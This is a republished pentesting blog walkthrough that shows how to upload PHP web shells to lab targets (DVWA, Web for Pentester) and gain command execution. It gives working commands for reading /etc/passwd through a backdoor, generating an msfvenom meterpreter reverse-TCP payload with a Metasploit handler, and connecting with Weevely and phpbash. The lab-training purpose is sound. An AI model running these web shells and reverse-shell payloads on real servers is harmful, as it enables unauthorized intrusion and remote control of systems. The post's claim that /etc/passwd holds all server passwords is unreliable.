---
title: 'Web Shells Penetration Testing'
date: 2019-09-25T08:06:00+01:00
draft: false
---

This post will describe the various PHP web Shell uploading technique to take unauthorized access of the webserver by injecting a malicious piece of code that are written in PHP.

### **Table of Content**

*   **Introduction of PHP Web shells**
*   **Inbuilt Kali’s web shells**
    *   simple backdoor.php
    *   qsd-php backdoor web shell
    *   php-reverse-shell.php
*   **Using MSF venom**
*   **Weevely php web shell**
*   **PHP\_bash web shell**

### **Requirements**

Attacker: Kali Linux

Target: Web for Pentester, DVWA

### **Introduction of PHP Web Shells**

Web shells are the scripts which are coded in many languages like PHP, Python, ASP, Perl and so on which further use as backdoor for illegitimate access in any server by uploading it on a web server.

The attacker can then directly perform the read and write operation once the backdoor is uploaded to a destination, you can edit any file of delete the server file. Today we are going to explore all kinds of php web shells what-so-ever are available in Kali Linux and so on. So, let’s get started.

Kali Linux has inbuilt PHP Scripts for utilizing them as a backdoor to assist Pen-testing work. They are stored inside **/usr/share/webshells/php** and a pen-tester can directory make use of them without wasting time in writing PHP code for the malicious script.

*   simple backdoor.php
*   qsd-php backdoor web shell
*   php-reverse-shell.php

### **Simplebackdoor.php shell**

Simple-backdoor.php is a kind of web shell that can generate a remote code execution once injected in the web server and script made by “John Troon”. It is already accessible in Kali in the/usr/share/web shells/php folder as shown in the pic below and after that, we will run ls -al command to check the permissions given to the files.

```
cd /usr/share/webshells/php  
ls -al
```

**![](https://i0.wp.com/1.bp.blogspot.com/-UQ9gMnwdhbc/XYsHP6iBEYI/AAAAAAAAgsM/nY-BNlNqnggB0ZayiFngT2JFSF4Sq7hcQCLcBGAsYHQ/s1600/1.png?w=687&ssl=1)**

Now you must discover a way to upload a shell in your application. As we have to do all this Web for Pentesters, so we will first try to upload here simple backdoor php shell which is already available in kali and click on send the file to upload the shell.

![](https://i2.wp.com/1.bp.blogspot.com/-gTUojqQRQn0/XYsHSr0JPSI/AAAAAAAAgs4/Mla-hDKZxTkMBxzUFa6_KqzEJngi1AhvgCLcBGAsYHQ/s1600/2.png?w=687&ssl=1)

As you can see, we have successfully uploaded the malicious php file and received the hyperlink for the uploaded file.

![](https://i2.wp.com/1.bp.blogspot.com/-Ys6-oacfifk/XYsHU1lgrKI/AAAAAAAAgtc/qV-I8DIRXdIRs2XRckoNNO-vJKmSS-ygQCLcBGAsYHQ/s1600/3.png?w=687&ssl=1)

Thus, we try to access simple-backdoor.php and obtain the following output. As we can observe that here “cmd=cat+/etc/passwd” is a clear indication for Remote code execution.

![](https://i1.wp.com/1.bp.blogspot.com/-xvfT3Xy_O5o/XYsHV9tPByI/AAAAAAAAgtk/3gcrDauKC3wNVj77q1maP0B6xYmD3Dw1QCLcBGAsYHQ/s1600/4.png?w=687&ssl=1)

So, let’s try and run cat+/etc/passwd to retrieve all the passwords of the server.

```
cmd=cat+/etc/passwd
```

As a result, we have extracted all records of passwd file, hence we can execute any command such as ls, cp and so on therefore we can obtain web shell by exploiting REC.

![](https://i2.wp.com/1.bp.blogspot.com/-E-yDlXrBvyM/XYsHWft6FgI/AAAAAAAAgto/bEFLoNKrv1g2XYWs2zit90BYTB9pPFYBwCLcBGAsYHQ/s1600/5.png?w=687&ssl=1)

### **qsd-php backdoor shell**

An exploit of a web shell generally considered as a backdoor that enables an attacker to access and control a server remotely and the qsd-php backdoor shell is a kind of backdoor which provides a platform for executing system command and the wonderful script made by “Daniel Berliner”.

As you can see, we have uploaded the qsd-php-backdoor.php file successfully.

![](https://i2.wp.com/1.bp.blogspot.com/-qxZi2lOFMSA/XYsHW1ehB7I/AAAAAAAAgts/kxxOfostlRcme4Im1YgSlKRSbTOse2DlwCLcBGAsYHQ/s1600/7.png?w=687&ssl=1)

Then try accessing qsd-php-backdoor.php as you did in the previous step and you will find something as shown in the image below. Here you can perform directory traversal and you can also access the Web Server directory directly by entering the command and clicking on the go button.

![](https://i1.wp.com/1.bp.blogspot.com/-aMGfCCheG0M/XYsHXeOZLNI/AAAAAAAAgtw/m7r6Xq-PrcAsOCdSCsaV6pOfqhh6lGt4gCLcBGAsYHQ/s1600/8.png?w=687&ssl=1)

As you can observe we have accessed the current directory directly without executing any system command.

![](https://i1.wp.com/1.bp.blogspot.com/-oEkF_J3MWb4/XYsHXzKamiI/AAAAAAAAgt0/8oj0IdMe0dAkpbyJZ_ufrIcrSNjZV1GegCLcBGAsYHQ/s1600/9.png?w=687&ssl=1)

We can also execute arbitrary system command since this backdoor provides a platform to execute the shell command such cat/etc/passwd, ls -al and much more. We can also run two commands simultaneously and see the result.

![](https://i0.wp.com/1.bp.blogspot.com/-Z65_O-aoRIo/XYsHP8y02BI/AAAAAAAAgsQ/quLd_3PjBdolAjB_JZU4ZCTNfcq5RrOYgCLcBGAsYHQ/s1600/10.png?w=687&ssl=1)

As you can see that we have got the result successfully.

![](https://i1.wp.com/1.bp.blogspot.com/-1pXzjUN4KuI/XYsHP3CvRdI/AAAAAAAAgsU/hx-pI-1EfucZGz-yPefehOa6GZY0CvdhwCLcBGAsYHQ/s1600/11.png?w=687&ssl=1)

### **PHP-reverse shell**

Now its turn to move towards our next php web shell which is php-reverse-shell.php which will open an outbound TCP connection from the webserver to a host and script made by “pentestmonkey”. A shell will be attached to the TCP connection (reverse TCP connection). You can run interactive programs such as telnet, ssh etc with this script. It is different from the other Web shells script, through which you can send a single command and then return the output.

For this, we need to open this script through nano

```
nano php-reverse-shell.php
```

![](https://i1.wp.com/1.bp.blogspot.com/-B6ePhQhThIY/XYsHQvKK1kI/AAAAAAAAgsY/AClGfPKcc7EsX6PtrzXmEJKpVgL4O86mACLcBGAsYHQ/s1600/12.png?w=687&ssl=1)

Here we need to give the LISTEN\_IP (Kali Linux) where we want the connection and LISTEN\_PORT number can be set any.

![](https://i0.wp.com/1.bp.blogspot.com/-KJex5cMQYpw/XYsHQxb-rQI/AAAAAAAAgsc/YDDKzj6dtP0EST0k_9hZPPqyJYfAGsC6QCLcBGAsYHQ/s1600/13.png?w=687&ssl=1)

 Now we need to upload this web shell in order to get the reverse connection. So, we will upload the malicious file and on the other hand start netcat listener inside a new terminal.

![](https://i1.wp.com/1.bp.blogspot.com/--5Pnp1SLbHo/XYsHRM_9zwI/AAAAAAAAgsg/lexUOW-RlSkw9qexWI4xJliouyJQq46CgCLcBGAsYHQ/s1600/14.png?w=687&ssl=1)

We can see that it is uploaded successfully.

![](https://i2.wp.com/1.bp.blogspot.com/-VUF4GsjThmM/XYsHRH5xPYI/AAAAAAAAgsk/WvEnNkmMJN0WFWEoDAxUDL-GcUqtjDKqACLcBGAsYHQ/s1600/15.png?w=687&ssl=1)

Now as soon as you will execute the uploaded file and If all went well, then, the webserver should have thrown back a reverse shell to your netcat listener. And you can verify that we have got the shell successfully.

![](https://i1.wp.com/1.bp.blogspot.com/-icey_1TqC8o/XYsHRne8x_I/AAAAAAAAgso/TOb2W3c_coAcgC_fP-qYLlw897gD72bXACLcBGAsYHQ/s1600/16.png?w=687&ssl=1)

### **PHP Backdoor using MSFvenom **

We can also generate a php web shell with the help of msfvenom. We, therefore, write use msfvenom following command for generating malicious php code in raw format.

```
msfvenom -p php/meterpreter/reverse\_tcp lhost=192.168.1.106 lport=4444 R
```

Then copy the code and save it by the name of meter.php

![](https://i0.wp.com/1.bp.blogspot.com/-eQECZj8uQBA/XYsHSJ1_9II/AAAAAAAAgss/mbzWf79R6ZIc4UdKhR8rT1QXkS-t76a7ACLcBGAsYHQ/s1600/17.png?w=687&ssl=1)

Now we will upload this malicious shell in DVWA lab to get the reverse connection. Now you can see the “meter.php successfully uploaded” message from the screenshot, meaning that our php backdoor is effectively uploaded.

![](https://i1.wp.com/1.bp.blogspot.com/-xDYj1pGNSsA/XYsHSCyl_ZI/AAAAAAAAgsw/20TVTPZyVukFv38ZllYrEFqqAv24E3frwCLcBGAsYHQ/s1600/18.png?w=687&ssl=1)

In order to execute the shell, we will open the URL of DVWA.

![](https://i2.wp.com/1.bp.blogspot.com/-_2uQyUAWYQs/XYsHSCM3xgI/AAAAAAAAgs0/N8Rg4zHECp0Wn8vtXhNgiFhvyASt8ufUQCLcBGAsYHQ/s1600/19.png?w=687&ssl=1)

Simultaneously we will start multi handler where we will get the meterpreter shell and we will run the following commands where we need to specify the lhost and lport to get the reverse connection.

```
use exploit/multi/handler  
set payload php/meterpreter/reverse\_tcp  
set lhost 192.168.1.106  
set lport 4444  
exploit  
sysinfo
```

As soon as you will explore the uploaded path and execute the backdoor, it will give you a meterpreter session.

![](https://i1.wp.com/1.bp.blogspot.com/-b0dYL1x-MRc/XYsHStPFT0I/AAAAAAAAgs8/AMnFYfTtkFQlZ3VSqRqCbzF7OSARBNugwCLcBGAsYHQ/s1600/20.png?w=687&ssl=1)

### **Weevely Shell**

Weevely is a stealthy PHP internet shell which simulates the link to Telnet and is designed for remote server administration and penetration testing. It can be used as a stealth backdoor a web shell to manage legit web accounts, it is an essential tool for web application post-exploitation. We can generate a PHP backdoor protected with the password.

Open the terminal and type weevely to generate a php backdoor and also set a password as in our case we have taken “**raj123**” and save this web shell as **weevely.php**

```
weevely generate raj123 weevely.php
```

![](https://i2.wp.com/1.bp.blogspot.com/-XYt8mtKqNh4/XYsHTG-vIdI/AAAAAAAAgtA/vDwUkbk0cA0PIcivtMApNf3kT_x5KZbrQCLcBGAsYHQ/s1600/21.png?w=687&ssl=1)

Now upload this web shell at the target location as in our case we have uploaded it at Web for pen testers and we will open the URL in the browser to execute the web shell.

![](https://i2.wp.com/1.bp.blogspot.com/-_9SvE7ZfQuY/XYsHTGwbRuI/AAAAAAAAgtE/ZgK8-ItaxD0nNwpjYSYcwNkScNFs0FqtQCLcBGAsYHQ/s1600/22.png?w=687&ssl=1)

Type the following instruction to initiate the webserver attack and put a copied URL into the Weevely command using password raj123 and you can see that we have got the victim shell through weevely. We can verify this by id command.

```
weevely http://192.168.1.104/upload/images/weevely.php raj123  
id
```

![](https://i2.wp.com/1.bp.blogspot.com/-Ran8pcF7DiU/XYsHTRI-2WI/AAAAAAAAgtI/yZFY1O4B_A0dDJkd-QssAmVSZtawFaWKwCLcBGAsYHQ/s1600/23.png?w=687&ssl=1)

You can also check all the functionality of weevely through help command.

![](https://i1.wp.com/1.bp.blogspot.com/-chN6OrUyHt4/XYsHT65kMmI/AAAAAAAAgtM/g-ShNMYgfeQP4zzDVE6nA-BL_XaYSJEAQCLcBGAsYHQ/s1600/24.png?w=687&ssl=1)

### **PHPbash shell**

Phpbash is an internet shell that is autonomous, semi-interactive. We are going to download it from GitHub and then we will go inside the directory phpbash and execute ls -al command to check the available files.

```
git clone https://github.com/Arrexel/phpbash.git  
cd phpbash/  
ls -al
```

So inside phpbash, we found a php script named “phpbash.php”, upload this script at your target location.

![](https://i2.wp.com/1.bp.blogspot.com/-zXhJN8FU3WE/XYsHT_kcYMI/AAAAAAAAgtQ/uijyeTnbEjgvqbovq7R-FxlLk4Yxq2e-gCLcBGAsYHQ/s1600/26.png?w=687&ssl=1)

Now we will upload this web shell in DVWA lab and we can see the message that it is uploaded successfully.

![](https://i2.wp.com/1.bp.blogspot.com/-F7iuhp-S7oQ/XYsHT6ayb7I/AAAAAAAAgtU/-hsfPgwRmYEPHkwdvLIUSAjSwuNVd0_hQCLcBGAsYHQ/s1600/28.png?w=687&ssl=1)

Going ahead; we will open the URL to execute the shell.

![](https://i1.wp.com/1.bp.blogspot.com/-f9US3a5-YOc/XYsHUvP8y9I/AAAAAAAAgtY/X6m17pbgZdcjia936P_aQjPfDgRhnrosgCLcBGAsYHQ/s1600/29.png?w=687&ssl=1)

Here our phpbash malicious file is executed and given the web shell. The benefit of the phpbash is that it doesn’t require any type of listener such as netcat because it has inbuilt bash shell that you can observe from the given image.

As a result, we have bash shell of www-data and we can execute system command directly through this platform.

![](https://i0.wp.com/1.bp.blogspot.com/-65bbWIcsTrg/XYsHVb_RBDI/AAAAAAAAgtg/azY0eT2dKwUjNE8hMGmYRpQsWP0v8i2ywCLcBGAsYHQ/s1600/30.png?w=687&ssl=1)

So, this way we have explored and performed numerous ways to get the web shell through php web shells; which you can find under this single article.

**Author**: Geet Madan is a Certified Ethical Hacker, Researcher and Technical Writer at Hacking Articles on Information Security**. **Contact [**here**](https://www.linkedin.com/in/geet-madan-86568b170/)

The post [Web Shells Penetration Testing](https://www.hackingarticles.in/web-shells-penetration-testing/) appeared first on [Hacking Articles](https://www.hackingarticles.in).

  
  
from Hacking Articles https://ift.tt/2lzX5Tp